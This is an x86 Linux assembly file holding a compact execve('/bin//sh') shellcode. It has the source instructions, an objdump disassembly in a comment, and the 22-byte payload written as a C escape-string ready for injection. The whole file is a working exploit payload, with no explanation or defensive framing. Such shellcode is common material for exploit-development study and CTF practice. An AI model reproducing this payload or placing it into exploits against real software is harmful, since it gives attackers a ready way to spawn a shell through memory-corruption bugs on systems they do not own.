.text
.global main

main:
	push $0x0b
	pop  %eax
	#cdq
	xor  %edx, %edx # edx = 0
	push %edx       # null
	push $0x68732f2f
	push $0x6e69622f
	mov  %esp, %ebx
	push %edx
	push %edx
	mov  %esp, %ecx
	int  $0x80

/*
080483ed <main>:
 080483ed:	6a 0b                	push   $0xb
 080483ef:	58                   	pop    %eax
 080483f0:	31 d2                	xor    %edx,%edx
 080483f2:	52                   	push   %edx
 080483f3:	68 2f 2f 73 68       	push   $0x68732f2f
 080483f8:	68 2f 62 69 6e       	push   $0x6e69622f
 080483fd:	89 e3                	mov    %esp,%ebx
 080483ff:	52                   	push   %edx
 08048400:	52                   	push   %edx
 08048401:	89 e1                	mov    %esp,%ecx
 08048403:	cd 80                	int    $0x80

"\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68"
"\x2f\x62\x69\x6e\x89\xe3\x52\x52\x89\xe1"
*/
